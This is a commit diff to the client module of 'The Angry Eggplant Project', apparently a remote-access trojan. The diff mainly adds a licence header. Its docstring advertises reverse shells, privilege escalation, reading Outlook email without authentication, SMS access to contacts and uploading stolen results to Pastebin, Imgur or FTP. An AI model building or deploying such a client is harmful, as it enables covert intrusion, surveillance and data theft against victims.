363a8c53f46a0b4f593c721900f717bca6c4b2ba
colental <dm7718940@gmail.com>
2018-04-06 21:15:55 -0700

    04-06-18

--- ae/client.py
+++ ae/client.py
@@ -1,12 +1,31 @@
 #!/usr/bin/python
-# The Angry Eggplant Project
-# https://github.com/colental/ae
+#
+#    Copyright (c) 2017 Daniel Vega-Myhre
+#
+#    Permission is hereby granted, free of charge, to any person obtaining a copy
+#    of this software and associated documentation files (the "Software"), to deal
+#    in the Software without restriction, including without limitation the rights
+#    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+#    copies of the Software, and to permit persons to whom the Software is
+#    furnished to do so, subject to the following conditions:
+#
+#    THE ABOVE COPYRIGHT NOTICE AND THIS PERMISSION NOTICE SHALL BE INCLUDED IN ALL
+#    COPIES OR SUBSTANTIAL PORTIONS OF THE SOFTWARE.
+#
+#    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+#    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+#    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
+#
+#    IN NO EVENT SHALL THE
+#    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+#    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+#    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+#    SOFTWARE.
 
+'''
 
-''' 
-
-   The Angry Eggplant Project
-
+   The Angry Eggplant Project (https://github.com/colental/ae)
+    
 >  30+ modules - interactive & automated
     - Reverse Shell   remotely access host machine with a shell
     - Root Acess      obtain administrator privileges
@@ -20,7 +39,7 @@
     - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
     - Email           Outlook email of a logged in user can be accessed without authentication
     - SMS             Send & receive SMS text messages with user's contacts
-
+    
 >  Portability - supports all major platforms & architectures
     - no configuration - dynamically generates a unique client configured for the host
     - no dependencies - packages, interpreter & modules all loaded remotely
@@ -42,7 +61,7 @@ for pkg in ['os', 'sys', 'mss', 'cv2', 'wmi', 'time', 'json', 'zlib', 'uuid', 'n
     try:
         exec 'import {}'.format(pkg) in globals()
     except: pass
-
+        
 
 def config(*arg, **options):
     def _config(function):
@@ -87,7 +106,6 @@ class Client():
     _lock    = threading.Lock()
     _jobs    = Queue.Queue()
     _flags   = {'prompt': threading.Event(),'connection': threading.Event(), 'mode': threading.Event()}
-#    __name__ = 'Client'
 
     def __init__(self, config=None):
         """
